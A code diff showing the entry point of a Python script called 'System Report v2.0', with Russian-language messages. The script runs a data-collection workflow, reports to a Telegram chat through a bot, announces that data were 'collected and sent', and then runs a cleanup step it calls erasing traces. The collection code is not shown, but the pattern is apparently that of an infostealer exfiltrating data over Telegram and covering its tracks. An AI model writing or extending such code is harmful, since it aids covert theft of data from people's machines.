@@ -942,24 +942,50 @@ def main_workflow():
     except:
         pass
 
-if LOCK_FILE.exists():
-        sys.exit()
+# ... (весь предыдущий код остается без изменений до самого конца) ...
+
+if __name__ == "__main__":
+    # Добавлена диагностика запуска
+    print("="*50)
+    print(f"Запуск System Report v2.0 | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print("="*50)
+    
+    # Проверка блокировки с диагностикой
+    debug_log(f"Проверка lock-файла: {LOCK_FILE}")
+    if LOCK_FILE.exists():
+        debug_log("Обнаружен lock-файл - завершение работы")
+        print("[!] Программа уже запущена. Завершение.")
+        sys.exit(0)
     
     try:
+        # Создаем lock-файл с PID
         with open(str(LOCK_FILE), 'w') as f:
             f.write(str(os.getpid()))
-    except:
-        sys.exit()
-    
-    try:
+        debug_log(f"Создан lock-файл с PID: {os.getpid()}")
+        
+        print("[+] Начало сбора данных...")
         main_workflow()
-    except:
+        debug_log("[+] Основной поток завершен успешно")
+        print("[✓] Данные успешно собраны и отправлены!")
+        
+    except Exception as e:
+        debug_log(f"!!! Критическая ошибка в main: {traceback.format_exc()}")
+        print(f"[X] Критическая ошибка: {str(e)}")
         try:
-            bot.send_message(TELEGRAM_CHAT_ID, "Критическая ошибка")
+            bot.send_message(TELEGRAM_CHAT_ID, f"Критическая ошибка: {str(e)[:1000]}")
         except:
             pass
     finally:
+        debug_log("Запуск очистки...")
         cleanup()
+        print("[✓] Очистка следов завершена")
+    
+    # Фиксируем завершение работы
+    debug_log("Программа завершена")
+    print("="*50)
+    print("Программа завершит работу через 60 секунд...")
+    print("="*50)
+    time.sleep(60)
     
     print("Программа завершена")
     time.sleep(60)
